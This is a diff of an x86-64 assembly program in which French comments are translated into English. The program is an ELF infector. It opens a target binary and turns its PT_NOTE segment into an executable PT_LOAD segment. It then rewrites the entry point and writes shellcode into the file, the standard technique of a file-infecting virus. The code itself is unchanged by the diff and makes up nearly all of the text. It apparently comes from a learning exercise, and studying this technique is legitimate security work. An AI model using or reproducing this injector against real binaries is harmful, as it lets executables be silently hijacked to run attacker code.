@@ -26,31 +26,31 @@ section .text
 
 _start:
 
-;----------------------------------------ouverture du fichier en mode lecture / écriture --------------------------------
+;----------------------------------------Opening the file in read / write mode --------------------------------
     pop rax
-    cmp rax, 2 ;; nb d'elem
+    cmp rax, 2 ;; number of elements
     jne error
-    ; on retire le nom du fichier executable
+    ; remove the executable file name
     pop rsi
-    ; recuperation de l'argument 1
+    ; retrieve argument 1
     pop rax
     mov [filename], rax
     mov rax, 2
     mov rdi, [filename]
     mov rsi, 2
     syscall
-    ; verification des erreurs
+    ; error checking
     test rax, rax 
     js error
-    ; Sauvegarde du descripteur de fichier
+    ; Save the file descriptor
     mov [fd], rax
-    ; Lecture du fichier
+    ; Read the file
     mov rax, 0
     mov rdi, [fd]
     mov rsi, buffer
     mov rdx, 2000
     syscall
-;--------------------------------------calcule de la taille de fichier-------------------------------
+;--------------------------------------calculate file size-------------------------------
     mov rax, 8
     mov rdi, [fd]
     mov rsi, 0
@@ -74,10 +74,10 @@ _start:
     syscall
 
 
-;----------------------------------------Sauvegarde de l'entrée du programme (e_entry)--------------------------------
-    mov rsi, buffer               ; Adresse du début de l'entête ELF
-    mov rax, [rsi + 0x18]         ; Lecture du champ e_entry (64 bits)
-    mov [entry_point], rax        ; Sauvegarde dans la zone de mémoire
+;----------------------------------------Save program entry point (e_entry)--------------------------------
+    mov rsi, buffer               ; Address of the start of the ELF header
+    mov rax, [rsi + 0x18]         ; Read the e_entry field (64 bits)
+    mov [entry_point], rax        ; Save to memory area
 
 ;---------------------------------------PT_NOTE--------------------------------
 _parse_phr:
@@ -100,11 +100,11 @@ _parse_phr:
     pt_note_ok:
     
     mov [note_offset], rbx
-    ;remise a 0 des registres
+    ; reset registers to 0
     xor rax,rax
     xor rcx,rcx
     xor rdx,rdx
-;-----------------------------------transformation du pt note en pt load (p_type)---------------------------------------
+;-----------------------------------transformation of pt_note to pt_load (p_type)---------------------------------------
     mov rax,8
     mov rdi, [fd]
     mov rsi, [note_offset]
@@ -119,7 +119,7 @@ _parse_phr:
     mov rdx, 2
     syscall
     xor rax,rax
-;-----------------------------------transformation du pt note en pt load (p_flags)---------------------------------------
+;-----------------------------------transformation of pt_note to pt_load (p_flags)---------------------------------------
     mov rax, 8
     mov rdi, [fd]
     mov rsi, [note_offset]
@@ -135,7 +135,7 @@ _parse_phr:
     mov rdx, 2
     syscall
     xor rax,rax
-;-----------------------------------transformation du pt note en pt load (p_vaddr)---------------------------------------
+;-----------------------------------transformation of pt_note to pt_load (p_vaddr)---------------------------------------
     mov rax, [p_vaddr]
     add rax, [file_size]
     mov [new_vaddr], rax
@@ -158,7 +158,7 @@ _parse_phr:
     syscall
     xor rax,rax
 
-;-----------------------------------transformation du pt note en pt load (taille fichier)---------------------------------------
+;-----------------------------------transformation of pt_note to pt_load (file size)---------------------------------------
     mov rax, 8
     mov rdi, [fd]
     mov rsi, [note_offset]
@@ -175,7 +175,7 @@ _parse_phr:
     syscall
     xor rax,rax
 
-;-----------------------------------transformation du pt note en pt load (taille mémoire)---------------------------------------
+;-----------------------------------transformation of pt_note to pt_load (memory size)---------------------------------------
     mov rax, 8
     mov rdi, [fd]
     mov rsi, [note_offset]
@@ -192,7 +192,7 @@ _parse_phr:
     syscall
     xor rax,rax
 
-;-----------------------------------transformation du pt note en pt load (alignement)---------------------------------------
+;-----------------------------------transformation of pt_note to pt_load (alignment)---------------------------------------
     mov rax, 8
     mov rdi, [fd]
     mov rsi, [note_offset]
@@ -210,7 +210,7 @@ _parse_phr:
     xor rax,rax
 
 
-;--------------------------changement du p-offset-----------------------------------------------------
+;--------------------------change p-offset-----------------------------------------------------
         xor rax,rax
         mov rax, 8
         mov rdi, [fd]
@@ -229,7 +229,7 @@ _parse_phr:
         xor rax,rax
 
 
-;--------------------------changement du e-entry-----------------------------------------------------
+;--------------------------change e-entry-----------------------------------------------------
     mov rax, 8
     mov rdi, [fd]
     mov rsi, 0x18
@@ -244,7 +244,7 @@ _parse_phr:
     xor rax, rax
 
 
-;--------------------------écriture du shellcode-----------------------------------------------------
+;--------------------------write shellcode-----------------------------------------------------
 
     mov rax, 8
     mov rdi, [fd]
@@ -261,12 +261,12 @@ _parse_phr:
     syscall
 
 
-;----------------------------------------fermeture du fichier --------------------------------
+;----------------------------------------close file --------------------------------
     mov rax, 3
     mov rdi, [fd]
     syscall
 
-;----------------------------------------sortie--------------------------------
+;----------------------------------------exit--------------------------------
     mov rax, 60
     mov rdi, 0
     syscall
